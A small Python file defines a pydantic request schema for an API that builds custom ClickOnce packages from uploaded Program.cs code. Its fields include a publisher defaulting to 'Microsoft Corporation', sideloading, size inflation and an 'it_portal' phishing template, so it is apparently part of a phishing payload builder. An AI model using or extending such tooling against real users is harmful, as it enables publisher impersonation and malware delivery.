"""
Model for Custom ClickOnce build requests (bring-your-own Program.cs)
"""
from pydantic import BaseModel


class CustomPayload(BaseModel):
    """POST body for /api/custom-build"""
    name: str
    version: str = "1.0.0.0"
    publisher: str = "Microsoft Corporation"
    description: str = ""
    sideload: str
    inflate: int = 0
    phish_template: str = "it_portal"
    provider_url: str = ""
    program_cs_b64: str          # base64-encoded Program.cs content
    icon: str = ""               # optional base64 .ico
